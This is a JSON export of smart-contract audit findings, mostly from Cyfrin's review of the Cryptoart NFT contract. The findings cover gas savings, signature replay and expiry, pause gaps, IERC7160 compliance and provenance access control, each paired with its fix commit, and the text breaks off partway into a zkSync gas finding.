{
  "category": "NFT Marketplace",
  "total_findings": 910,
  "fetched_at": "2026-01-29T13:45:30Z",
  "findings": [
    {
      "id": "55588",
      "title": "To prevent duplicate ids in `_batchBurn`, enforce ascending order instead of nested `for` loops",
      "impact": "GAS",
      "content": "**Description:** In `_batchBurn` to prevent duplicate ids, instead of using nested `for` loops it is more efficient to [enforce ascending order of ids](https://x.com/DevDacian/status/1734885772829045205) using only 1 `for` loop.\n\nAdditionally, the duplicate id check can be completely removed since if there is a duplicate id the second `burn` call will revert. For example this test added to `test/unit/BurnOperationsTest.t.sol`:\n```solidity\n    function test_DoubleBurn() public {\n        // Mint a token to user1\n        mintNFT(user1, TOKEN_ID, TOKEN_PRICE, TOKEN_PRICE);\n        testAssertions.assertTokenOwnership(nft, TOKEN_ID, user1);\n\n        // First burn should succeed\n        vm.prank(user1);\n        nft.burn(TOKEN_ID);\n\n        // Second burn should revert since token no longer exists\n        vm.prank(user1);\n        // vm.expectRevert();\n        nft.burn(TOKEN_ID);\n    }\n```\n\nResults in:\n```solidity\n    ├─ [4294] TransparentUpgradeableProxy::fallback(1)\n    │   ├─ [3940] CryptoartNFT::burn(1) [delegatecall]\n    │   │   └─ ← [Revert] ERC721NonexistentToken(1)\n    │   └─ ← [Revert] ERC721NonexistentToken(1)\n    └─ ← [Revert] ERC721NonexistentToken(1)\n```\n\n**CryptoArt:**\nFixed in commit [3c39fb8](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/3c39fb86db6b92424a0cf55c315d0d6284c267bf).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55587",
      "title": "`burn` should delete `tokenURI` related data and emit `TokenUriUnpinned` event",
      "impact": "GAS",
      "content": "**Description:** The `burn` function should delete `tokenURI` related data and emit `TokenUriUnpinned` event:\n```diff\n    function burn(uint256 tokenId) public override whenNotPaused {\n        // require sender is owner or approved has been removed as the internal burn function already checks this\n        ERC2981Upgradeable._resetTokenRoyalty(tokenId);\n        ERC721BurnableUpgradeable.burn(tokenId);\n        emit Burned(tokenId);\n+       emit TokenUriUnpinned(tokenId);\n+       delete _tokenURIs[tokenId];\n+       delete _pinnedURIIndex[tokenId];\n+       delete _hasPinnedTokenURI[tokenId];\n    }\n```\n\nThis provides a gas refund as part of the burn and also removes token data that should no longer exist. It also prevents `hasPinnedTokenURI` from returning `true` for a burned token since that function doesn't check for valid token id (another issue has been created to track this).\n\n**CryptoArt:**\nFixed in commit [b554763](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/b5547630515c8da112db6754a3e25dda1e69b4a7).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55586",
      "title": "In `tokenURI` avoid copying entire `_tokenURIs[tokenId]` from `storage` into `memory`",
      "impact": "GAS",
      "content": "**Description:** `tokenURI` only uses the \"pinned\" URI index so there's no reason to copy both token URIs from `storage` to `memory`. Simply use a `storage` reference like this:\n```diff\n    function tokenURI(uint256 tokenId)\n        public\n        view\n        override(ERC721Upgradeable)\n        onlyIfTokenExists(tokenId)\n        returns (string memory)\n    {\n-       string[2] memory uris = _tokenURIs[tokenId];\n+       string[2] storage uris = _tokenURIs[tokenId];\n        string memory uri = uris[_getTokenURIIndex(tokenId)];\n\n        if (bytes(uri).length == 0) {\n            revert Error.Token_NoURIFound(tokenId);\n        }\n\n        return string.concat(_baseURI(), uri);\n    }\n```\n\n**CryptoArt:**\nFixed in commit [591fed0](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/591fed0798ab0cd61fe965c9a4d0b3e8461e0f12).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55585",
      "title": "Remove obsolete `onlyTokenOwner` from `_transferToNftReceiver`",
      "impact": "GAS",
      "content": "**Description:** Since `_transferToNftReceiver` calls `ERC721Upgradeable::safeTransferFrom`, the `onlyTokenOwner` modifier is obsolete and inefficient as:\n* `safeTransferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L183) `transferFrom`\n* `transferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L166) `_update` passing `_msgSender()` as the last `auth` parameter\n* `_update` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L274) `_checkAuthorized` since the `auth` parameter was valid\n* `_checkAuthorized` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L215-L238) `_isAuthorized` which verifies the caller is either the token's owner or someone who the token owner has approved\n\n**CryptoArt:**\nFixed in commit [75e179b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/75e179b3cea8855977a391ace169313053bc2de5).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55584",
      "title": "Use named constants to indicate purpose of magic numbers",
      "impact": "GAS",
      "content": "**Description:** Use named constants to indicate purpose of magic numbers. For example in reference to the value of the `_tokenURIs` mapping:\n* instead of using literal `2`, use existing named constant `URIS_PER_TOKEN`:\n```solidity\nCryptoartNFT.sol\n72:    mapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;\n358:        returns (uint256, string[2] memory, bool)\n361:        string[2] memory uris = _tokenURIs[tokenId];\n698:        string[2] memory uris = _tokenURIs[tokenId];\n```\n\n* when setting uris in `updateMetadata` and `_setTokenURIs`, use named constants for the indexes:\n```solidity\nfunction updateMetadata(uint256 tokenId, string calldata newRedeemableURI, string calldata newNotRedeemableURI)\n    external\n    onlyOwner\n    onlyIfTokenExists(tokenId)\n{\n    _tokenURIs[tokenId][URI_REDEEMABLE_INDEX] = newRedeemableURI;\n    _tokenURIs[tokenId][URI_NOT_REDEEMABLE_INDEX] = newNotRedeemableURI;\n    emit MetadataUpdate(tokenId); // ERC4906\n}\n```\n\nThis can also save gas for example in `pinTokenURI`, instead of using `_tokenURIs[tokenId].length` just use the constant `URIS_PER_TOKEN` since it never changes:\n```solidity\nfunction pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {\n    if (index >= URIS_PER_TOKEN) {\n        revert Error.Token_IndexOutOfBounds(tokenId, index, URIS_PER_TOKEN - 1);\n    }\n```\n\n**CryptoArt:**\nFixed in commit [97ef0ad](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/97ef0add6848540e158927092d0a1af820e840fe).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55583",
      "title": "Prefer named return parameters, especially for `memory` returns",
      "impact": "GAS",
      "content": "**Description:** Prefer named return parameters, especially for memory returns. For example `tokenURIs` can be refactored to remove local variables and explicit return:\n```solidity\nfunction tokenURIs(uint256 tokenId)\n    external\n    view\n    override\n    onlyIfTokenExists(tokenId)\n    returns (uint256 index, string[2] memory uris, bool isPinned)\n{\n    index = _getTokenURIIndex(tokenId);\n    uris = _tokenURIs[tokenId];\n    isPinned = _hasPinnedTokenURI[tokenId];\n}\n```\n\n**CryptoArt:**\nFixed in commit [bdd28fa](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/bdd28fa71f8d445fb3306a1fdc16b49fa5b5d1e4).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55582",
      "title": "Remove unused constant `CryptoartNFT::ROYALTY_BASE`",
      "impact": "LOW",
      "content": "**Description:** The `CryptoartNFT` contract defines a constant `ROYALTY_BASE` with a value of 10,000 that is never used in the contract. This constant is intended to represent the denominator for royalty percentage calculations (where 10,000 = 100%), but it's not referenced anywhere in the contract's implementation.\n\n**Recommended Mitigation:** Remove the unused constant to improve code clarity and reduce deployment gas costs.\n\n**Cryptoart:**\nFixed in commit [0c0dd8c](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/0c0dd8c8d01e1b5b396852d38faceee007b37891).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55581",
      "title": "`MintType` is almost never enforced",
      "impact": "LOW",
      "content": "**Description:** The contract has an enumeration `MintType` which defines several types of mints:\n```solidity\nenum MintType {\n    OpenMint,\n    Whitelist,\n    Claim,\n    Burn\n}\n```\n\nBut there are never any checks for these mint types, for example:\n* there is no check for `MintType.Whitelist` and no corresponding whitelist enforcement\n* the `claim` function doesn't enforce input `data.mintType == MintType.Claim`\n* similarly `burnAndMint` doesn't enforce input `data.mintType == MintType.Burn`\n\nThe only place input `data.mintType` is used is in `_validateSignature` to validate that the input parameter matches what was signed, but there is no other validation that the correct mint types are being used for the correct operations.\n\n**CryptoArt:**\nFixed in commit [deaf964](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/deaf96420b3176be09c1522ea8c79a211f77ef82).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55580",
      "title": "Consider limiting max royalty to prevent large amount or all of the sale fee being taken as royalty",
      "impact": "LOW",
      "content": "**Description:** Currently `updateRoyalties` and `setTokenRoyalty` allow the contract owner to set a royalty up to `10_000` which would take the entire sale fee as a royalty. Consider limiting these functions to set the max royalty to something more reasonable like 1000 (10%).\n\n**CryptoArt:**\nFixed in commit [1d1125e](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/1d1125e5a021f2926dc2a2e39e05c065e3bd207c).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55579",
      "title": "Signatures have no expiration deadline",
      "impact": "LOW",
      "content": "**Description:** Signatures which have [no expiration parameter](https://dacian.me/signature-replay-attacks#heading-no-expiration) effectively grant a lifetime license. Consider adding an expiration parameter to the signature that if used after that time results in the signature being invalid.\n\n**CryptoArt:**\nFixed in commit [a93977d](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/a93977d2ef0b54319c7668d9fc6abda688b355c1).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55578",
      "title": "Protocol vulnerable to cross-chain signature replay",
      "impact": "LOW",
      "content": "**Description:** As signatures do not include`chainId`, signature verification is vulnerable to [cross-chain replay](https://dacian.me/signature-replay-attacks#heading-cross-chain-replay).\n\n**Impact:** Although the protocol plans to deploy cross-chain in the future, the specification of this audit is to only consider deployment to one chain. Hence this finding is only Informational as this attack path is not possible when the protocol is only deployed on one chain.\n\n**Recommended Mitigation:** Include `block.chainid` as a signature parameter.\n\n**CryptoArt:**\nFixed in commit [1e25f8c](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/1e25f8cd172a32e3e35ccf8a86e7af9fe1ed47fe).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55577",
      "title": "Inconsistent pause functionality allows certain state-changing operations when contract is paused",
      "impact": "LOW",
      "content": "**Description:** The `CryptoartNFT` contract implements a pause mechanism using OpenZeppelin's `PausableUpgradeable` contract. However, the pause functionality is inconsistently applied across the contract's functions. While minting and burning operations are properly protected with the `whenNotPaused` modifier, several other state-changing functions remain accessible even when the contract is paused, including token transfers, metadata management, and story-related functions.\n\nThe following state-changing functions lack the `whenNotPaused` modifier:\n\n1. Token transfers and approvals (inherited from ERC721)\n2. Metadata management functions:\n   - `updateMetadata`\n   - `pinTokenURI`\n   - `markAsRedeemable`\n3. Story-related functions:\n   - `addCollectionStory`\n   - `addCreatorStory`\n   - `addStory`\n   - `toggleStoryVisibility`\n\n**Impact:** When the contract is paused (typically during emergencies or upgrades), users can still perform various state-changing operations that might be undesirable during a pause period. It could lead to unexpected state changes during contract upgrades or emergency situations.\n\n**Recommended Mitigation:** Add the `whenNotPaused` modifier to all state-changing functions to ensure consistent behavior when the contract is paused. For example:\n\n**Cryptoart:**\nFixed in commit [e7d7e5b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/e7d7e5b3b1c8976a11d49f889b4168ce649be2ee).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55576",
      "title": "`IERC7160` specification requires `pinTokenURI` to revert for non-existent `tokenId`",
      "impact": "LOW",
      "content": "**Description:** Per the specification of `IERC7160`:\n```solidity\n/// @notice Pin a specific token uri for a particular token\n/// @dev This call MUST revert if the token does not exist\nfunction pinTokenURI(uint256 tokenId, uint256 index) external;\n```\n\nBut the implementation of `pinTokenURI` doesn't revert for tokens which don't exist, since `_tokenURIs[tokenId].length` will always equal 2 even for non-existent `tokenId`:\n```solidity\n// mapping value always has fixed array size of 2\nmapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;\n\nfunction pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {\n    if (index >= _tokenURIs[tokenId].length) {\n        revert Error.Token_IndexOutOfBounds(tokenId, index, _tokenURIs[tokenId].length - 1);\n    }\n\n    _pinnedURIIndex[tokenId] = index;\n\n    emit TokenUriPinned(tokenId, index);\n    emit MetadataUpdate(tokenId);\n}\n```\n\n**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:\n```diff\n-    function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {\n+    function pinTokenURI(uint256 tokenId, uint256 index) external onlyIfTokenExists(tokenId) onlyOwner {\n```\n\n**CryptoArt:**\nFixed in commit [0409ae4](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/0409ae4d81225a351c4d42620502843242f2604f).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55575",
      "title": "`IERC7160` specification requires `hasPinnedTokenURI` to revert for non-existent `tokenId`",
      "impact": "LOW",
      "content": "**Description:** Per the specification of `IERC7160`:\n```solidity\n/// @notice Check on-chain if a token id has a pinned uri or not\n/// @dev This call MUST revert if the token does not exist\nfunction hasPinnedTokenURI(uint256 tokenId) external view returns (bool pinned);\n```\n\nBut the implementation of `hasPinnedTokenURI` doesn't revert for tokens which don't exist, instead it will simply return `false` or even return `true` if a token was burned when the value was true since burning doesn't delete `_hasPinnedTokenURI` (another issue has been created to track this):\n```solidity\nfunction hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {\n    return _hasPinnedTokenURI[tokenId];\n}\n```\n\n**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:\n```diff\n-    function hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {\n+    function hasPinnedTokenURI(uint256 tokenId) external view onlyIfTokenExists(tokenId) returns (bool) {\n```\n\n**CryptoArt:**\nFixed in commit [56d0e22](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/56d0e222cdf25a971cd6466fd4757185a4362069).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55574",
      "title": "Allow users to increment their nonce to void their signatures",
      "impact": "LOW",
      "content": "**Description:** Currently users are unable to void their signatures by incrementing their nonce, since `NoncesUpgradeable::_useNonce` is `internal` and only called during actions which verify user signatures.\n\nA user may want to invalidate a previous signature to prevent it from being used but is unable to.\n\n**Impact:** Users are unable to invalidate previous signatures before they are used.\n\n**Recommended Mitigation:** Expose `NoncesUpgradeable::_useNonce` via a `public` function that allows users to increment their own nonce.\n\n**CryptoArt:**\nFixed in commit [cf82aeb](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/cf82aeb30d6a262cde51897f52c302be995d0202).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55573",
      "title": "Prevent code-injection inside `string` fields when emitting `IStory` events or setting `tokenURI` fields",
      "impact": "LOW",
      "content": "**Description:** An attack vector which spans the intersection between web3 and web2 is when users can [associate arbitrary metadata strings with NFTs](https://medium.com/zokyo-io/under-the-hackers-hood-json-injection-in-nft-metadata-3be78d0f93a7) and those strings are later processed or displayed on a website.\n\nIn particular the `IStory::Story` event:\n* is emitted by a non-trusted entity, the current holder of the artwork\n* emits two arbitrary string parameters, `collectorName` and `story`\n* these string parameters are designed to be displayed to users and may be processed by web2 apps\n\n**Recommended Mitigation:** The most important validation is for non-trusted user-initiated functions, eg:\n* When a Creator emits `CreatorStory` or a Collector emits `Story`, revert if the `name` and `story` strings contain any unexpected special characters\n* When minting tokens revert if `TokenURISet::uriWhenRedeemable` and `uriWhenNotRedeemable` contain any unexpected special characters - though this must be done using off-chain components controlled by the protocol so risk here is minimal\n* In off-chain code don't trust any user-supplied strings but sanitize them or check them for unexpected special characters\n\n**CryptoArt:**\nAcknowledged; mitigation handled off-chain via URI validation pre-signing, Story string sanitization/encoding post-event.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55572",
      "title": "Allow custom Creator and Collector names to be emitted in `IStory` events to build artwork provenance",
      "impact": "LOW",
      "content": "**Description:** The `IStory` interface is designed to allow custom names to be emitted for the Creator and Collector events. Here is an [example](https://www.transient.xyz/nfts/base/0x6c81306129b3cc63b0a6c7cec3dd50721ac378fe/9) where a Creator has used the custom name `lytke`.\n\nBut in CryptoArt's implementation of `IStory` interface, custom names are not allowed and it is always the caller's hex string that will be set:\n```solidity\nfunction addCollectionStory(string calldata, /*creatorName*/ string calldata story) external onlyOwner {\n    emit CollectionStory(msg.sender, msg.sender.toHexString(), story);\n}\n\n/// @inheritdoc IStory\nfunction addCreatorStory(uint256 tokenId, string calldata, /*creatorName*/ string calldata story)\n    external\n    onlyTokenOwner(tokenId)\n{\n    emit CreatorStory(tokenId, msg.sender, msg.sender.toHexString(), story);\n}\n\n/// @inheritdoc IStory\nfunction addStory(uint256 tokenId, string calldata, /*collectorName*/ string calldata story)\n    external\n    onlyTokenOwner(tokenId)\n{\n    emit Story(tokenId, msg.sender, msg.sender.toHexString(), story);\n}\n```\n\n**Impact:** Custom names should be allowed as they form part of the \"provenance\" of an artwork; the value of an artwork is often based on who the creator was and if it has been held by significant collectors in the past. Proper custom names are a lot easier to remember and tell a story about rather than 0x1343335...Artworks with custom names will be able to build a better story around them resulting in improved \"provenance\".\n\n**CryptoArt:**\nFixed in commit [77f34a4](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/77f34a49cbc27589f3179b35b58a86696696bf83).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "55571",
      "title": "Collector can add `CreatorStory`, corrupting the provenance of an artwork",
      "impact": "MEDIUM",
      "content": "**Description:** The purpose of the `IStory` interface is to allow 3 different entities (Admin, Creator and Collectors) to add \"Stories\" about a given artwork (NFT) which [describes the provenance of the artwork](https://docs.transientlabs.xyz/tl-creator-contracts/common-features/story-inscriptions). In the art world the \"provenance\" of an item can affect its status and price, so the `IStory` interface aims to facilitate an on-chain record of an artwork's \"provenance\".\n\n`IStory` is designed to work like this:\n* Creator/Admin can add a `CollectionsStory` for when a collection is added to a contract\n* Creator of an artwork can add a `CreatorStory`\n* Collector of an artwork can add one or more `Story` about their experience while holding the artwork\n\nThe `IStory` interface specification requires that `addCreatorStory` is only called by the creator:\n```solidity\n/// @notice Function to let the creator add a story to any token they have created\n/// @dev This function MUST implement logic to restrict access to only the creator\nfunction addCreatorStory(uint256 tokenId, string calldata creatorName, string calldata story) external;\n```\n\nBut in the CryptoArt implementation of the `IStory` interface, the current token owner can always emit `CreatorStory` events:\n```solidity\nfunction addCreatorStory(uint256 tokenId, string calldata, /*creatorName*/ string calldata story)\n    external\n    onlyTokenOwner(tokenId)\n{\n    emit CreatorStory(tokenId, msg.sender, msg.sender.toHexString(), story);\n}\n```\n\n**Impact:** As an NFT is sold or transferred to new owners, each subsequent owner can continue to add new `CreatorStory` events even though they aren't the Creator of the artwork. This corrupts the provenance of the artwork by allowing Collectors to add to the `CreatorStory` as if they were the Creator.\n\n**Recommended Mitigation:** Only the Creator of an artwork should be able to emit the `CreatorStory` event. Currently the on-chain protocol does not record the address of the creator; this could either be added or `onlyOwner` could be used where the contract owner acts as a proxy for the creator.\n\n**CryptoArt:**\nFixed in commit [94bfc1b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/94bfc1b1454e783ef1fb9627cfaf0328ebe17b47#diff-1c61f2d0e364fa26a4245d1033cdf73f09117fbee360a672a3cb98bc0eef02adL439-R439).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "\nThe `IStory` interface is used to add \"Stories\" about a given artwork (NFT) to record its \"provenance\" or history. However, in the CryptoArt implementation, anyone who owns the artwork can add a `CreatorStory` event, corrupting the provenance by allowing non-Creators to add to it. To fix this, only the Creator should be able to emit the `CreatorStory` event and the contract owner could act as a proxy for the Creator. This issue has been fixed in the CryptoArt contract.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Cryptoart",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-24-cyfrin-cryptoart-v2.0.md",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Hans",
        "Dacian"
      ]
    },
    {
      "id": "33292",
      "title": "[G-47] Storage values shouldn't be updated when value is not being changed",
      "impact": "GAS",
      "content": "\n<details>\n\n**Files:** `SystemContext.sol`, `Bridgehub.sol`, `ValidatorTimelock.sol`, `Governance.sol`, `StateTransitionManager.sol`, `Admin.sol`, `ContractDeployer.sol`\n\nIt's recommended to add additional `require` statement, which will verify if the value is really changed, before we will store it in the storage variables\nE.g., let's consider a function `setChainId()` from `SystemContext.sol`. When `chainId` is `1` and we will call `setChainId(1)`, function will re-store the same value (Gsreset (900 gas)).\n\n[File: code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol#L51)\n```solidity\n51:     function setPendingAdmin(address _newPendingAdmin) external onlyOwnerOrAdmin {\n```\n\n[File: code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol#L108)\n```solidity\n108:     function setSharedBridge(address _sharedBridge) external onlyOwner {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L132)\n```solidity\n132:     function setValidatorTimelock(address _validatorTimelock) external onlyOwnerOrAdmin {\n[...]\n137:     function setInitialCutHash(Diamond.DiamondCutData calldata _diamondCut) external onlyOwner {\n[...]\n142:     function setNewVersionUpgrade(\n[...]\n152:     function setUpgradeDiamondCut(\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L110)\n```solidity\n110:     function setPendingAdmin(address _newPendingAdmin) external onlyOwnerOrAdmin {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L73)\n```solidity\n73:     function setStateTransitionManager(IStateTransitionManager _stateTransitionManager) external onlyOwner {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L96)\n```solidity\n96:     function setExecutionDelay(uint32 _executionDelay) external onlyOwner { \n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L79)\n```solidity\n79:     function setTokenMultiplier(uint128 _nominator, uint128 _denominator) external onlyAdminOrStateTransitionManager {\n[...]\n89:     function setValidiumMode(PubdataPricingMode _validiumMode) external onlyAdmin {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L45)\n```solidity\n45:     function setValidator(address _validator, bool _active) external 